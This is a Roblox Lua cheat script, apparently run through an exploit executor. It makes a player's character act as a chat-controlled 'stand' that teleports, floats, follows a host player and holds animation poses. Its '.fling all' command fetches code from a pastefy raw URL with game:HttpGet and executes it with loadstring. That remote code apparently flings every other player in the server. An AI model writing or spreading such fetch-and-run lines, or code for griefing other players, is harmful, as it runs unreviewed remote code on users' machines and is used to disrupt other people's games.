-- Respawn teleport logic
local function teleportToPlatformOnRespawn()
    player.CharacterAdded:Connect(function(newCharacter)
        humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart")
        humanoid = newCharacter:WaitForChild("Humanoid")

        local plat = platform or createOrGetPlatform()
        humanoidRootPart.CFrame = CFrame.new(plat.Position + Vector3.new(0, plat.Size.Y / 2 + 3, 0))

        destroyFloating() -- Ensure floating fully resets after respawn
    end)
end

-- Helper Functions
local function disableHumanoidStates()
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
end

local function stopAllAnimations()
    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:Stop()
    end
end

local function playPoseAnimation(animationId, timePosition)
    stopAllAnimations()
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
    local animation = Instance.new("Animation")
    animation.AnimationId = animationId

    local track = animator:LoadAnimation(animation)
    track.Priority = Enum.AnimationPriority.Action
    track.Looped = false
    track:Play()
    track.TimePosition = timePosition
    task.wait(0.1)
    track:AdjustSpeed(0)

    lastPose = animationId
    lastTimePosition = timePosition
end

local function ensureAnimationPersists()
    playPoseAnimation(lastPose, lastTimePosition)
end

local function createOrGetPlatform()
    if not platform then
        local currentPos = humanoidRootPart.Position
        local platformPos = currentPos + Vector3.new(0, 400, 0)

        platform = Instance.new("Part")
        platform.Size = partSize
        platform.Position = platformPos
        platform.Anchored = true
        platform.CanCollide = true
        platform.Name = "StandPosition"
        platform.Transparency = 0.6
        platform.Color = Color3.fromRGB(30, 30, 30)
        platform.Material = Enum.Material.SmoothPlastic
        platform.Parent = workspace
    end
    return platform
end

local function teleportToPlatform()
    local plat = createOrGetPlatform()
    humanoidRootPart.CFrame = CFrame.new(plat.Position + Vector3.new(0, plat.Size.Y / 2 + 3, 0))
end

local function teleportBehindHost(host)
    if host and host.Character and host.Character:FindFirstChild("HumanoidRootPart") then
        local hostHRP = host.Character.HumanoidRootPart
        local offset = (hostHRP.CFrame.LookVector * forwardBackwardOffset) + (hostHRP.CFrame.RightVector * leftRightOffset)
        local targetPosition = hostHRP.Position + offset

        humanoidRootPart.CFrame = CFrame.new(targetPosition) * CFrame.Angles(0, select(2, hostHRP.CFrame:ToEulerAnglesYXZ()), 0)
    end
end

local floatingConnection
local bodyPosition

local function destroyFloating()
    if floatingConnection then
        floatingConnection:Disconnect()
        floatingConnection = nil
    end

    if bodyPosition then
        bodyPosition:Destroy()
        bodyPosition = nil
    end
end

local function startFloating()
    disableHumanoidStates()
    stopAllAnimations()
    ensureAnimationPersists()

    if not bodyPosition then
        bodyPosition = Instance.new("BodyPosition")
        bodyPosition.MaxForce = Vector3.new(5000, 5000, 5000)
        bodyPosition.P = 3000
        bodyPosition.D = 100
        bodyPosition.Position = humanoidRootPart.Position
        bodyPosition.Parent = humanoidRootPart
    end

    local baseHeight = humanoidRootPart.Position.Y + 3.5
    local floatRange = 0.5
    local floatSpeed = 3

    floatingConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local time = tick() * floatSpeed
        local newY = baseHeight + math.sin(time) * floatRange

        if anchored then
            bodyPosition.Position = Vector3.new(bodyPosition.Position.X, newY, bodyPosition.Position.Z)
        else
            bodyPosition.Position = Vector3.new(humanoidRootPart.Position.X, newY, humanoidRootPart.Position.Z)
        end
    end)
end

local function stopFloating()
    destroyFloating()
end

local followingConnection

local function startFollowingHost()
    followingConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if currentHost and currentHost.Character and currentHost.Character:FindFirstChild("HumanoidRootPart") then
            if anchored then return end

            local hostHRP = currentHost.Character.HumanoidRootPart
            local offset = (hostHRP.CFrame.LookVector * forwardBackwardOffset) + (hostHRP.CFrame.RightVector * leftRightOffset)
            local targetPosition = hostHRP.Position + offset

            humanoidRootPart.CFrame = CFrame.new(targetPosition.X, humanoidRootPart.Position.Y, targetPosition.Z)
                * CFrame.Angles(0, select(2, hostHRP.CFrame:ToEulerAnglesYXZ()), 0)
        end
    end)
end

local function stopFollowingHost()
    if followingConnection then
        followingConnection:Disconnect()
        followingConnection = nil
    end
end

local function findPlayer(query)
    query = query:lower()
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Name:lower():sub(1, #query) == query or player.DisplayName:lower():sub(1, #query) == query then
            return player
        end
    end
    return nil
end

-- Function to listen to a host's commands
local function listenToHost(host)
    if host then
        host.Chatted:Connect(function(message)
            local msgLower = message:lower()

            -- Main Host Commands
            if host == mainHost and msgLower == ".return" then
                if currentHost ~= mainHost then
                    currentHost = mainHost
                end
            end

            -- Host Switching
            if host == mainHost and msgLower:sub(1, 6) == ".host " then
                local newHostName = msgLower:sub(7)
                local newHost = findPlayer(newHostName)
                if newHost then
                    stopFloating()
                    stopFollowingHost()
                    teleportToPlatform()
                    currentHost = newHost
                    listenToHost(currentHost)
                end
            end

            -- Current Host Commands
            if host == currentHost then
                if msgLower == ".summon" then
                    chatChannel:SendAsync(summonMessage)
                    teleportBehindHost(currentHost)
                    stopFloating() -- Destroy floating before re-enabling
                    startFollowingHost()
                    startFloating()
                elseif msgLower == ".vanish" then
                    stopFloating()
                    stopFollowingHost()
                    teleportToPlatform()
                elseif msgLower == ".pose 1" then
                    playPoseAnimation("rbxassetid://10714347256", 2)
                elseif msgLower == ".pose 2" then
                    playPoseAnimation("rbxassetid://134283166482394", 1)
                elseif msgLower == ".pose 3" then
                    playPoseAnimation("rbxassetid://10714347453", 1.2)
                elseif msgLower == ".pose 4" then
                    playPoseAnimation("rbxassetid://12507085924", 6)
                elseif msgLower == ".pose 5" then
                    playPoseAnimation("rbxassetid://15549124879", 4)
                elseif msgLower == ".anchor" then
                    anchored = true
                    chatChannel:SendAsync("Anchored.")
                elseif msgLower == ".unanchor" then
                    anchored = false
                elseif msgLower:sub(1, 6) == ".quote" then
                    summonMessage = message:sub(8)
                    chatChannel:SendAsync("Quote Set.")
                elseif msgLower == ".fling all" then
                    stopFloating()
                    stopFollowingHost()
                    local http = game:HttpGet("https://pastefy.app/VGnJnhkg/raw")
                    loadstring(http)()

                    -- Re-enable floating and following after 10 seconds if still alive
                    task.delay(10, function()
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            startFollowingHost()
                            startFloating()
                        end
                    end)
                end
            end
        end)
    end
end

